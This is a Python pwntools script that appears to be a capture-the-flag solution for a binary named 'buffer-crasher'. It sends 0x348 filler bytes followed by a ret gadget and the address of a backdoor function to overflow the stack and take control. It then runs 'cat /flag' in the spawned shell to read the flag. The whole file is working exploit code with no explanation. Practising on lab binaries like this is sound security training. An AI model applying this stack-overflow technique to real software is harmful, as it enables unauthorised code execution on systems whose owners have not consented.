from pwn import *

HOST, PORT = '172.17.0.1', 10101
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./home/buffer-crasher')

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

backdoor = 0x401196
ret = 0x4011ac
payload = b'A' * 0x348 + flat(ret, backdoor)
io.sendlineafter('.', payload)

# io.interactive()

io.clean(1)
io.sendline('cat /flag')
flag = io.readuntil('}').strip()
success(flag)
